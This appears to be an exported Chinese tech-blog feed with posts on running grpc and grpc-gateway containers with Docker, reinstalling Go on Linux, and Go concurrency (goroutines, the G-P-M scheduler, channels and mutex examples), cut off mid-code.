<h3 id="2-2-根据-Dockerfile-生成镜像"><a href="#2-2-根据-Dockerfile-生成镜像" class="headerlink" title="2.2. 根据 Dockerfile 生成镜像"></a>2.2. 根据 Dockerfile 生成镜像</h3><p>生成镜像时，我们只需构建 <code>server</code> 和 <code>gateway</code> 两个运行阶段即可，两个阶段依赖的 <code>builder</code> 阶段镜像会自动构建，并在构建完成后自动删除。分别得到 grpc 服务端和 grpc-gateway 网关镜像：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">docker build --target server -t &lt;server_image_name&gt; .</span><br><span class="line">docker build --target gateway -t &lt;gateway_image_name&gt; .</span><br></pre></td></tr></table></figure>

<h3 id="2-3-容器运行"><a href="#2-3-容器运行" class="headerlink" title="2.3. 容器运行"></a>2.3. 容器运行</h3><p>由于 grpc-gateway 网关需要访问 grpc 服务端，因此：</p>
<ul>
<li><strong>本地运行</strong>时，可以创建容器网络，并将两个容器接入网络，则相互之间可通过<strong>容器名</strong>访问：</li>
</ul>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">docker network create my-net</span><br><span class="line">docker run -d --name server --network my-net -p 8081:8081 &lt;server_image_name&gt;</span><br><span class="line">docker run -d --name gateway --network my-net -p 8080:8080 &lt;gateway_image_name&gt; /root/Gateway --server_addr server:8081</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>分布式运行</strong>时，则需要提供 <code>server</code> 的 IP 地址：</li>
</ul>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">docker run -d --name server -p 8081:8081 &lt;server_image_name&gt;</span><br><span class="line">docker run -d --name gateway -p 8080:8080 &lt;gateway_image_name&gt; /root/Gateway --server_addr &lt;server_ip&gt;:8081</span><br></pre></td></tr></table></figure>

<h3 id="2-4-运行结果"><a href="#2-4-运行结果" class="headerlink" title="2.4. 运行结果"></a>2.4. 运行结果</h3><p><img src="/docker%E5%85%A5%E9%97%A8/3.png" alt="pic"></p>
<p>用 postman 进行接口测试：</p>
<p><img src="/docker%E5%85%A5%E9%97%A8/4.png" alt="pic"></p>
<h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>不得不说，docker 的出现，让很多事情变得轻而易举。举一个很简单的例子：如果你想在电脑上安装 MySQL ，直接运行 docker 的 MySQL 镜像即可，几行命令搞定，再也不用麻烦地配置环境了。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://juejin.im/post/6844903815729119245">30 分钟快速入门 Docker 教程</a></li>
<li><a href="https://yeasy.gitbook.io/docker_practice/">Docker —— 从入门到实践</a></li>
<li><a href="https://juejin.im/post/6844903847383547911">Docker容器间通信方法</a></li>
</ul>
]]></content>
      <categories>
        <category>欲穷千里目，更上一层楼</category>
        <category>云</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>grpc</tag>
      </tags>
  </entry>
  <entry>
    <title>go从入门到重装(linux系统)</title>
    <url>/go%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%8D%B8%E8%BD%BD-linux%E7%B3%BB%E7%BB%9F.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我在安装配置(非本人操作)了go的linux虚拟机上，尝试用 <code>$ go get github.com/astaxie/beego</code> 获取beego框架。但是，却出现了一个奇怪的错误： <code>go: cannot find main module; see &#39;go help modules&#39;</code> ，怎么查询都没有找到问题原因。这对于一个刚接触go和linux的新手来说，是手足无措的。于是，心生一计，卸载重装。</p>
<span id="more"></span>

<h2 id="一、卸载"><a href="#一、卸载" class="headerlink" title="一、卸载"></a>一、卸载</h2><h3 id="1-删除GOROOT目录"><a href="#1-删除GOROOT目录" class="headerlink" title="1.删除GOROOT目录"></a>1.<del>删除</del>GOROOT目录</h3><p>用 <code>$ go env</code> 找到GOROOT目录，在我的linux上为 <code>src/go</code> ，而常见的应该是 <code>usr/local/go</code> 。然后，<del>使用<code>$ rm -rf</code>删除该目录。</del>(用这个命令是不可能的，这辈子都不可能用的，这个命令删除文件真香)我<strong>不建议这样删除</strong>，因为与Windows不同，linux这样删除文件之后几乎是很难复原的。其中，<code>-r</code> 指向下递归，不管有多少级目录，一并删除；<code>-f</code> 指直接强行删除，不作任何提示的意思。可以看出，这个命令是很野蛮的。</p>
<p>所以，我们就暂时先保留这个目录。</p>
<h3 id="2-删除GOPATH目录"><a href="#2-删除GOPATH目录" class="headerlink" title="2.删除GOPATH目录"></a>2.删除GOPATH目录</h3><p>这个目录可以保留。也可以用上述那个命令删除，如果其中没有重要文件的话。</p>
<p>卸载这步就结束了(实际上并没卸载)。</p>
<h2 id="二、下载"><a href="#二、下载" class="headerlink" title="二、下载"></a>二、下载</h2><h3 id="1-下载安装包"><a href="#1-下载安装包" class="headerlink" title="1.下载安装包"></a>1.下载安装包</h3><p><code>$ wget https://studygolang.com/dl/golang/go1.10.4.linux-amd64.tar.gz</code>  从网上找linux go1.10 版本源码的下载网址(因为modules好像是go1.11版本的东西)，然后下载到当前目录。下载完，<code>$ ls</code> 就能看到一个名为 go1.10.4.linux-amd64.tar.gz 的压缩包。</p>
<p>注：为什么要下载压缩包自己解压安装呢？是因为apt便捷安装版本是1.6的，而且什么都由apt帮你完成，因其隐秘而不喜。喜欢自己下载自己安装，清楚知道每一步、每一包在哪。</p>
<h3 id="2-解压"><a href="#2-解压" class="headerlink" title="2.解压"></a>2.解压</h3><p><code>$ tar -zxvf go1.10.4.linux-amd64.tar.gz</code>  解压到当前目录，得到一个名为 go 的文件夹，即go源码。</p>
<h3 id="3-转移"><a href="#3-转移" class="headerlink" title="3.转移"></a>3.转移</h3><p><code>$ mv go /usr/local/</code>  在下载go源码的目录下，将 go 源码文件夹移动到<code>/usr/local/</code>文件夹下。</p>
<p><strong>注解</strong>：</p>
<ul>
<li><p>在linux中，只有一个根目录即 <code>/</code> ，根目录包含了各种linux中重要的文件目录，如home&#x2F;、etc&#x2F;、usr&#x2F;、root&#x2F;目录等等。使用<code>$ cd /</code>命令即能直接到达根目录，不论你在任何目录下。而不管你在哪 <code>/usr/local/</code> 也能访问根目录下的usr文件夹。</p>
</li>
<li><p>另外，linux可以有多个用户，除了权限最大的root用户，还可以创建其它用户，如test用户。每个用户登录时都会进入该用户的 HOME 目录。root用户 HOME 目录即 <code>/root/</code> 目录，而test用户 HOME 目录为 <code>/home/test/</code> 。若要查看该用户HOME目录，可以 <code>$ echo $HOME</code> 。同样，<code>$ cd ~</code> 能直接到达用户 HOME 目录下。</p>
</li>
</ul>
<h2 id="三、配置"><a href="#三、配置" class="headerlink" title="三、配置"></a>三、配置</h2><p><code>$ vim /etc/profile</code>  编辑&#x2F;etc&#x2F;profile文件(全局变量配置文件)，增加以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> GOROOT=/usr/local/go</span><br><span class="line"><span class="built_in">export</span> GOPATH=<span class="variable">$HOME</span>/go</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$GOROOT</span>/bin:<span class="variable">$GOPATH</span>/bin</span><br></pre></td></tr></table></figure>

<p><strong>注解</strong>：</p>
<ul>
<li><code>GOROOT</code> 指向go的源码文件夹(即下载解压转移后的文件夹位置)。该文件夹下的 bin&#x2F; 目录是一些go命令的二进制执行文件。</li>
<li><code>GOPATH</code> 指向go的工作空间。此处推荐一篇博客<a href="https://www.cnblogs.com/pyyu/p/8032257.html">https://www.cnblogs.com/pyyu/p/8032257.html</a>。</li>
<li><code>PATH=$PATH:$GOROOT/bin:$GOPATH/bin</code> 是指在原有 PATH 环境变量路径上加上内容，<code>:</code>为分隔符。</li>
</ul>
<h2 id="四、查看成果"><a href="#四、查看成果" class="headerlink" title="四、查看成果"></a>四、查看成果</h2><p><code>$ go env</code> 查看 go 环境。</p>
<p><code>$ go get github.com/astaxie/beego</code> 成功，版本问题。</p>
]]></content>
      <categories>
        <category>不知道怎么分类的分类</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>go语言进阶-并发</title>
    <url>/go%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6-%E5%B9%B6%E5%8F%91.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><blockquote>
<p>优雅的并发编程范式，完善的并发支持，出色的并发性能是Go语言区别于其他语言的一大特色。</p>
</blockquote>
<p>接下来，我们将从原理到应用，深入了解go并发。</p>
<span id="more"></span>

<h2 id="1-并发与并行"><a href="#1-并发与并行" class="headerlink" title="1. 并发与并行"></a>1. 并发与并行</h2><p>这些经典概念，对于学过操作系统的同学或许并不陌生。</p>
<ul>
<li><strong>并发</strong>：多个代码片段（进程、线程）轮流在一个物理处理器（单核 CPU）上执行，通过快速的上下文切换，营造一种同时执行的假象，是虚假的同时执行。</li>
<li><strong>并行</strong>：多个代码片段（进程、线程）同时在不同的物理执行器上执行，是真正的同时执行。</li>
</ul>
<h2 id="2-进程-线程-协程"><a href="#2-进程-线程-协程" class="headerlink" title="2. 进程 线程 协程"></a>2. 进程 线程 协程</h2><ul>
<li><strong>进程</strong>：一个正在运行的程序，系统进行<strong>资源分配的基本单位</strong>，拥有独立的内存空间。</li>
<li><strong>线程</strong>：<strong>系统调度的基本单位</strong>，每个进程可以有一个到多个线程（进程的初始线程为主线程），线程有自己的寄存器和栈空间等，但也共享着进程的内存空间。这里的线程指<strong>内核级线程</strong>。</li>
<li><strong>协程</strong>：一种用户态的轻量级线程，协程的调度完全由用户控制，没有内核的开销。类似于<strong>用户级线程</strong>。</li>
</ul>
<h2 id="3-Goroutine"><a href="#3-Goroutine" class="headerlink" title="3. Goroutine"></a>3. Goroutine</h2><p>goroutine 是 Go 语言并发的关键部分，它是 Go 语言中的轻量级线程，也可以叫做用户级线程&#x2F;协程。它是 Go 语言中的<strong>多线程</strong>。</p>
<p>在 Go 语言中，创建并启动 goroutine 十分便捷，只需使用 <code>go</code> 关键字调用一个函数即可。如下，调用匿名函数启动一个 Goroutine：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;hello goroutine&quot;</span>)</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>

<p>同时，它的轻量体现在：</p>
<ul>
<li><strong>上下文切换代价更小</strong>。不必经过内核。</li>
<li><strong>栈空间占用小</strong>。线程栈空间通常是 2M，goroutine 栈空间最小 2K。</li>
</ul>
<p>而轻量级线程搭配 Go 语言并发调度器，Go 语言可以轻松支持上万 goroutine 并发运行。</p>
<h2 id="4-Go-并发调度器模型-G-P-M"><a href="#4-Go-并发调度器模型-G-P-M" class="headerlink" title="4. Go 并发调度器模型 G-P-M"></a>4. Go 并发调度器模型 G-P-M</h2><p>多进程&#x2F;多线程的第一大问题，便是<strong>调度问题</strong>。</p>
<p>底层多进程和内核级多线程的调度，操作系统已经帮我们解决了。但作为用户级线程，goroutine 的调度问题，当然要靠 Go 语言自己解决。而这，就是 Go <strong>调度器模型 G-P-M</strong> 的设计初衷。</p>
<p>介绍它之前，我们必须知道：内核级线程是系统调度的基本单位，这意味着系统只会给内核级线程分配物理处理器（CPU）；而用户级线程，操作系统是不可见的。</p>
<p>在 G-P-M 模型中，有三大部分：</p>
<ul>
<li><strong>G（Goroutine）</strong>：每个 goroutine 对应一个 G 结构体，G 存储 goroutine 的运行栈、状态以及任务函数。</li>
<li><strong>P（Processor）</strong>：逻辑处理器，Go 语言会在逻辑处理器上调度 goroutine 运行。</li>
<li><strong>M（Machine）</strong>：内核级线程，由系统调度。</li>
</ul>
<p>相互之间的关系如下图：</p>
<p><img src="/go%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6-%E5%B9%B6%E5%8F%91/1.png" alt="1"></p>
<ul>
<li><strong>M</strong> 内核级线程，运行时绑定在一个处理器（CPU 核）上；</li>
<li><strong>P</strong> 逻辑处理器需要绑定在一个 <strong>M</strong> 内核级线程上，才能运行；</li>
<li>一个 <strong>P</strong> 逻辑处理器可以调度多个 <strong>G（Goroutine）</strong>，但同一个时间只能有一个 <strong>G</strong> 在 <strong>P</strong> 上运行。</li>
</ul>
<p>既然知道了三者的关系，那么调度器如何进行统筹兼顾，实现高效率并发呢？调度器有以下几种行为（算法）：</p>
<ul>
<li><p><strong>创建 G 时</strong>：当创建一个 goroutine 并准备运行时，它会被调度器放到 <strong>全局运行队列（GRQ）</strong> 中。之后，调度器会把它分配给一个<strong>逻辑处理器 P</strong>，即将它放到这个逻辑处理器的 <strong>本地运行队列（LRQ）</strong> 中。</p>
</li>
<li><p><strong>及时切换 P 上的 G</strong>：与操作系统并发调度类似，当一个 goroutine 在逻辑处理器上运行时间过长（毫秒）时，调度器会停止当前 goroutine ，并给 LRQ 上其它 goroutine 运行机会。<br>  <img src="/go%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6-%E5%B9%B6%E5%8F%91/3.png" alt="1"></p>
</li>
<li><p><strong>拒绝摸鱼的 P</strong>：当一个逻辑处理器空闲时，调度器会从其它逻辑处理器或者全局队列上，为它分配 goroutine （这也叫<strong>任务窃取</strong>）。</p>
</li>
<li><p><strong>P 自动分离因系统调用而阻塞的 M</strong>：当 goroutine 需要执行一个阻塞的系统调用时（如：打开文件），调度器会将线程和 goroutine 从逻辑处理器上分离，并为逻辑处理器分配一个新线程，阻塞的 goroutine 返回后，会回到该逻辑处理器的本地队列中，而线程则继续使用。<br>  <img src="/go%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6-%E5%B9%B6%E5%8F%91/2.png" alt="1"></p>
</li>
<li><p><strong>将进行网络I&#x2F;O的 G 交给网络轮询器（NetPoller）</strong>：一旦该轮询器指示某个网络读或者写就绪，对应的 goroutine 就会重新回到之前的逻辑处理器上来完成操作。</p>
</li>
</ul>
<h2 id="5-Go-并发应用"><a href="#5-Go-并发应用" class="headerlink" title="5. Go 并发应用"></a>5. Go 并发应用</h2><p>一个 goroutine 的简单使用示例如下。创建两个 goroutine ，一个输出字符 <code>A</code> ，一个输出字符 <code>B</code> ，两个 goroutine 并发运行：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;runtime&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 分配一个逻辑处理器给调度器使用</span></span><br><span class="line">    runtime.GOMAXPROCS(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wg 用来等待 goroutine 结束，Add(2) 表示要等待两个 goroutine</span></span><br><span class="line">    <span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">    wg.Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明一个匿名函数，并创建一个 goroutine</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="comment">// 在函数退出时调用 Done 来通知 main 函数工作已经完成</span></span><br><span class="line">        <span class="keyword">defer</span> wg.Done()</span><br><span class="line">        <span class="keyword">for</span> count := <span class="number">0</span>; count &lt; <span class="number">10</span>; count++ &#123;</span><br><span class="line">            fmt.Printf(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">            time.Sleep(<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明一个匿名函数，并创建一个 goroutine</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="comment">// 在函数退出时调用 Done 来通知 main 函数工作已经完成</span></span><br><span class="line">        <span class="keyword">defer</span> wg.Done()</span><br><span class="line">        <span class="keyword">for</span> count := <span class="number">0</span>; count &lt; <span class="number">10</span>; count++ &#123;</span><br><span class="line">            fmt.Printf(<span class="string">&quot;B&quot;</span>)</span><br><span class="line">            time.Sleep(<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待 goroutine 结束</span></span><br><span class="line">    wg.Wait()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出（可能不相同）：BAABBAABBAABBAABBAAB</span></span><br></pre></td></tr></table></figure>

<h2 id="6-Go-并发同步模型-CSP"><a href="#6-Go-并发同步模型-CSP" class="headerlink" title="6. Go 并发同步模型 CSP"></a>6. Go 并发同步模型 CSP</h2><p>多进程&#x2F;多线程的第二大问题，则是<strong>同步问题（互斥是一种特殊的同步）</strong>。</p>
<p>Go 语言提供了传统的同步机制，包括：<strong>原子函数（<code>sync/atomic</code>）、互斥锁（<code>sync.Mutex</code>）、读写锁（<code>sync.RWMutex</code>）、条件变量（<code>sync.Cond</code>）</strong> 等。</p>
<p>同时，Go 语言也提出了独特的并发同步机制——来自一个叫作<strong>通信顺序进程（Communicating Sequential Processes，CSP）泛型</strong>。CSP 是一种消息传递模型，通过在 goroutine 之间传递数据来传递消息，而不是对数据进行加锁来实现同步访问。</p>
<p>Go 语言中的<strong>通道 channel</strong> 结构则实现了这一同步机制。</p>
<h2 id="7-channel-通道"><a href="#7-channel-通道" class="headerlink" title="7. channel 通道"></a>7. channel 通道</h2><p><code>channel</code> 是 Go 语言中的引用类型结构，声明后初值为 <code>nil</code>。</p>
<p>通道的基本操作如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声明一个整型 channel，为零值 nil</span></span><br><span class="line"><span class="keyword">var</span> channel <span class="keyword">chan</span> <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个只能发送的整型单通道（单通道多用于函数参数）</span></span><br><span class="line"><span class="keyword">var</span> send <span class="keyword">chan</span>&lt;- <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个只能接受的整型单通道</span></span><br><span class="line"><span class="keyword">var</span> receive &lt;-<span class="keyword">chan</span> <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 为无缓冲的整型单通道分配内存</span></span><br><span class="line">send = <span class="built_in">make</span>(<span class="keyword">chan</span>&lt;- <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建无缓冲的整型 channel</span></span><br><span class="line">unbuffered := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建有缓冲的字符串 channel</span></span><br><span class="line">buffered := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">fmt.Println(channel, send, receive, unbuffered, buffered)   <span class="comment">// &lt;nil&gt; 0xc000048060 &lt;nil&gt; 0xc0000480c0 0xc000044060</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 向通道发送数据（向字符串型通道发送字符串）</span></span><br><span class="line">buffered &lt;- <span class="string">&quot;hello goroutine&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从通道接收数据（从字符串型通道中接收一个字符串）</span></span><br><span class="line">value := &lt;-buffered</span><br><span class="line">fmt.Println(value)  <span class="comment">// hello goroutine</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭通道</span></span><br><span class="line"><span class="built_in">close</span>(buffered)</span><br><span class="line">fmt.Println(buffered)   <span class="comment">// 0xc000044060</span></span><br></pre></td></tr></table></figure>

<p>关于 <code>close()</code> 关闭通道函数的具体细节，可参考源码注释：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// The close built-in function closes a channel, which must be either</span></span><br><span class="line"><span class="comment">// bidirectional or send-only. It should be executed only by the sender,</span></span><br><span class="line"><span class="comment">// never the receiver, and has the effect of shutting down the channel after</span></span><br><span class="line"><span class="comment">// the last sent value is received. After the last value has been received</span></span><br><span class="line"><span class="comment">// from a closed channel c, any receive from c will succeed without</span></span><br><span class="line"><span class="comment">// blocking, returning the zero value for the channel element. The form</span></span><br><span class="line"><span class="comment">//  x, ok := &lt;-c</span></span><br><span class="line"><span class="comment">// will also set ok to false for a closed channel.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">close</span><span class="params">(c <span class="keyword">chan</span>&lt;- Type)</span></span></span><br></pre></td></tr></table></figure>

<p>接下来，主要介绍无缓冲通道和有缓冲通道，以及通道在 goroutine 同步中的应用。</p>
<h3 id="7-1-无缓冲通道"><a href="#7-1-无缓冲通道" class="headerlink" title="7.1. 无缓冲通道"></a>7.1. 无缓冲通道</h3><p><strong>无缓冲通道</strong>，是指通道中不能缓存数据。换句话说，<strong>发送方接收方必须都进入通道，才能完成数据传输</strong>，不然一方必须等待另一方。</p>
<p>发送方发送数据时，如果接收方还没准备好，则发送方会阻塞等待接收方；接收方准备好接收数据时，如果发送方还没来，则接受方也会阻塞。</p>
<p>如下图，第2步中发送方进入通道，但接收方还未进入，则发送方阻塞；第5、6步中接收方接收到数据，双方同时离开通道。</p>
<p><img src="/go%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6-%E5%B9%B6%E5%8F%91/4.png" alt="1"></p>
<h3 id="7-2-有缓冲通道"><a href="#7-2-有缓冲通道" class="headerlink" title="7.2. 有缓冲通道"></a>7.2. 有缓冲通道</h3><p><strong>有缓冲通道</strong>，是指通道中能缓存数据。</p>
<p>那么，通道并不要求双方必须同时完成发送和接受，<strong>发送方把数据放到通道中就可以离开，接收方从通道中拿到数据也可以离开</strong>。</p>
<p>但是，当通道中没有多余空间时，发送方需要阻塞；当通道中没有缓存数据时，接收方需要阻塞。</p>
<p>如下图，发送方放完数据就可以进行下一步，接收方拿到数据也可以进行下一步：</p>
<p><img src="/go%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6-%E5%B9%B6%E5%8F%91/5.png" alt="1"></p>
<h2 id="8-Go-实现同步"><a href="#8-Go-实现同步" class="headerlink" title="8. Go 实现同步"></a>8. Go 实现同步</h2><h3 id="8-1-实现互斥"><a href="#8-1-实现互斥" class="headerlink" title="8.1. 实现互斥"></a>8.1. 实现互斥</h3><p>互斥是同步的一种特殊情况，也是一种重要情况。</p>
<p>从 goroutine 的角度来看，<strong>互斥</strong>是指：不允许两个以上的并发 goroutine 同时进入访问共享资源的临界区。其中，<strong>临界区</strong>是指：访问临界资源的程序片段；<strong>临界资源</strong>是指：并发 goroutine 必须互斥访问的共享资源。</p>
<p>简单来说，互斥就是不允许多个 goroutine 同时读写共享变量。</p>
<h4 id="8-1-1-未实现互斥的后果"><a href="#8-1-1-未实现互斥的后果" class="headerlink" title="8.1.1. 未实现互斥的后果"></a>8.1.1. 未实现互斥的后果</h4><p>看如下例子，运行两个 goroutine 分别对全局变量 <code>count</code> 加10次1和10次2。如果程序不保证互斥，那么就会出现超乎预期的结果：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;runtime&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> count <span class="type">int</span></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="comment">// work 对 count 全局变量进行读写操作，未保护临界资源</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">work</span><span class="params">(add <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> wg.Done()</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        temp := count + add</span><br><span class="line">        runtime.Gosched() <span class="comment">// 当前 goroutine 从线程退出，并放回到队列</span></span><br><span class="line">        count = temp</span><br><span class="line">        fmt.Printf(<span class="string">&quot;add %d: %d\n&quot;</span>, add, count)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;init:&quot;</span>, count)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 要等待两个 goroutine</span></span><br><span class="line">    wg.Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> work(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">go</span> work(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待 goroutine 结束</span></span><br><span class="line">    wg.Wait()</span><br><span class="line">    fmt.Println(<span class="string">&quot;result:&quot;</span>, count)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行这段代码，<code>result</code> 时而输出 23、时而输出 10，各种各样奇怪的结果，总之很难得到正确答案 30。具体原因就不在此赘述了，学过操作系统、玩过多线程的肯定都清楚。</p>
<p>正如上文所说的，在 Go 语言中，实现互斥（同步）有很多种方法（机制），接下来将主要介绍 <strong>锁</strong> 和 <strong>通道</strong> 两种方法。</p>
<h4 id="8-1-2-锁实现互斥"><a href="#8-1-2-锁实现互斥" class="headerlink" title="8.1.2. 锁实现互斥"></a>8.1.2. 锁实现互斥</h4><p>对于上述例子，我们可以使用 <strong>互斥锁（sync.Mutex）</strong> 来保证互斥，用加锁解锁将临界区保护起来，从而保证程序的正确性。代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;runtime&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> count <span class="type">int</span></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">var</span> mutex sync.Mutex</span><br><span class="line"></span><br><span class="line"><span class="comment">// workWithMutex 对 count 全局变量进行读写操作，使用 mutex 互斥锁保护临界资源</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">workWithMutex</span><span class="params">(add <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> wg.Done()</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        <span class="comment">// 用互斥锁保护临界区</span></span><br><span class="line">        mutex.Lock()</span><br><span class="line">        temp := count + add</span><br><span class="line">        runtime.Gosched() <span class="comment">// 当前 goroutine 从线程退出，并放回到队列</span></span><br><span class="line">        count = temp</span><br><span class="line">        mutex.Unlock() <span class="comment">// 释放锁</span></span><br><span class="line">        fmt.Printf(<span class="string">&quot;add %d: %d\n&quot;</span>, add, temp)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;init:&quot;</span>, count)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 要等待两个 goroutine</span></span><br><span class="line">    wg.Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> workWithMutex(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">go</span> workWithMutex(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待 goroutine 结束</span></span><br><span class="line">    wg.Wait()</span><br><span class="line">    fmt.Println(<span class="string">&quot;result:&quot;</span>, count)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不管你怎样运行该程序，<code>result</code> 结果都是 30。</p>
<h4 id="8-1-3-通道实现互斥"><a href="#8-1-3-通道实现互斥" class="headerlink" title="8.1.3. 通道实现互斥"></a>8.1.3. 通道实现互斥</h4><p>用互斥锁实现互斥的方法，在很多语言中都很常见。</p>
<p>接下来，将介绍如何使用通道来实现互斥。同样是上述例子，代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;runtime&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> count <span class="type">int</span></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">var</span> countChan <span class="keyword">chan</span> <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// workWithChannel 对 count 全局变量进行读写操作，使用 channel 保护临界资源</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">workWithChannel</span><span class="params">(add <span 